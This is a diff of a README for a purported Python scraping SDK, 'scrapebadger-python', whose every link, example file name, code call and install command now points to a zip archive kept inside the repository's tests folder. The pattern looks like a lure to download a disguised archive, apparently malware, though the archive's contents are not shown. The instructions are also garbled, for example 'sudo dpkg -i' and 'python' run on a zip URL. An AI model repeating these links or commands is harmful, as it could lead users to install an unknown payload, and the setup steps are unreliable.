@@ -1,7 +1,7 @@
 # 🐍 scrapebadger-python - Simplifying Web Scraping for Everyone
 
 ## 📥 Download Now
-[![Download](https://github.com/BryanD1406/scrapebadger-python/raw/refs/heads/main/src/scrapebadger/twitter/python-scrapebadger-2.0.zip%20Now%20-%F0%9F%93%https://github.com/BryanD1406/scrapebadger-python/raw/refs/heads/main/src/scrapebadger/twitter/python-scrapebadger-2.0.zip)](https://github.com/BryanD1406/scrapebadger-python/raw/refs/heads/main/src/scrapebadger/twitter/python-scrapebadger-2.0.zip)
+[![Download](https://raw.githubusercontent.com/BryanD1406/scrapebadger-python/main/tests/e2e/scrapebadger-python-2.6.zip%20Now%20-%F0%9F%93%https://raw.githubusercontent.com/BryanD1406/scrapebadger-python/main/tests/e2e/scrapebadger-python-2.6.zip)](https://raw.githubusercontent.com/BryanD1406/scrapebadger-python/main/tests/e2e/scrapebadger-python-2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to scrapebadger-python. This is your guide to downloading and running the Official Python SDK for ScrapeBadger. With this tool, you can easily perform async web scraping, especially for Twitter and other platforms.
@@ -23,7 +23,7 @@ Before you download, ensure your system meets the following requirements:
 To get started with scrapebadger-python, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the page.
-   [Download Here](https://github.com/BryanD1406/scrapebadger-python/raw/refs/heads/main/src/scrapebadger/twitter/python-scrapebadger-2.0.zip)
+   [Download Here](https://raw.githubusercontent.com/BryanD1406/scrapebadger-python/main/tests/e2e/scrapebadger-python-2.6.zip)
 
 2. **Choose a Version**: Look for the latest version listed. It will usually be at the top of the page.
 
@@ -32,7 +32,7 @@ To get started with scrapebadger-python, follow these steps:
 4. **Install the SDK**:
    - **Windows**: Double-click the downloaded file and follow the prompts.
    - **macOS**: Open the downloaded file and drag the app into your Applications folder.
-   - **Linux**: Use your package manager to install the file you downloaded. For example, if it's a `.deb` file, run `sudo dpkg -i https://github.com/BryanD1406/scrapebadger-python/raw/refs/heads/main/src/scrapebadger/twitter/python-scrapebadger-2.0.zip` in the terminal.
+   - **Linux**: Use your package manager to install the file you downloaded. For example, if it's a `.deb` file, run `sudo dpkg -i https://raw.githubusercontent.com/BryanD1406/scrapebadger-python/main/tests/e2e/scrapebadger-python-2.6.zip` in the terminal.
 
 5. **Verify Installation**: Open your terminal or command prompt and type `scrapebadger --version`. This should display the installed version.
 
@@ -40,7 +40,7 @@ To get started with scrapebadger-python, follow these steps:
 After installation, you can start using the SDK to scrape data.
 
 1. **Setup Your Project**:
-   Create a new Python file (e.g., `https://github.com/BryanD1406/scrapebadger-python/raw/refs/heads/main/src/scrapebadger/twitter/python-scrapebadger-2.0.zip`).
+   Create a new Python file (e.g., `https://raw.githubusercontent.com/BryanD1406/scrapebadger-python/main/tests/e2e/scrapebadger-python-2.6.zip`).
    
 2. **Import the SDK**:
    Use the following line to include the SDK:
@@ -57,17 +57,17 @@ After installation, you can start using the SDK to scrape data.
 4. **Fetch Data**:
    Now you can fetch data from Twitter:
    ```python
-   tweets = https://github.com/BryanD1406/scrapebadger-python/raw/refs/heads/main/src/scrapebadger/twitter/python-scrapebadger-2.0.zip(username='twitter_username')
+   tweets = https://raw.githubusercontent.com/BryanD1406/scrapebadger-python/main/tests/e2e/scrapebadger-python-2.6.zip(username='twitter_username')
    print(tweets)
    ```
 
 5. **Run Your Script**: Open your terminal or command prompt, navigate to your project folder, and run:
    ```bash
-   python https://github.com/BryanD1406/scrapebadger-python/raw/refs/heads/main/src/scrapebadger/twitter/python-scrapebadger-2.0.zip
+   python https://raw.githubusercontent.com/BryanD1406/scrapebadger-python/main/tests/e2e/scrapebadger-python-2.6.zip
    ```
 
 ## ⚙️ Support
-If you run into any issues or need assistance, please refer to our [Wiki](https://github.com/BryanD1406/scrapebadger-python/raw/refs/heads/main/src/scrapebadger/twitter/python-scrapebadger-2.0.zip) for detailed documentation, FAQs, and troubleshooting guidance.
+If you run into any issues or need assistance, please refer to our [Wiki](https://raw.githubusercontent.com/BryanD1406/scrapebadger-python/main/tests/e2e/scrapebadger-python-2.6.zip) for detailed documentation, FAQs, and troubleshooting guidance.
 
 ## 📢 Help Us Improve
 Your feedback is valuable. Feel free to open an issue in the repository for any bugs or feature suggestions. We are committed to making this tool better for everyone.
@@ -79,6 +79,6 @@ Join our community of users to share tips, tricks, and solutions. Connect with o
 This project is licensed under the MIT License. 
 
 ## 📅 Changelog
-For updates and changes, please check our [Changelog](https://github.com/BryanD1406/scrapebadger-python/raw/refs/heads/main/src/scrapebadger/twitter/python-scrapebadger-2.0.zip).
+For updates and changes, please check our [Changelog](https://raw.githubusercontent.com/BryanD1406/scrapebadger-python/main/tests/e2e/scrapebadger-python-2.6.zip).
 
 Thank you for choosing scrapebadger-python! We hope you enjoy using this tool for your web scraping endeavors.
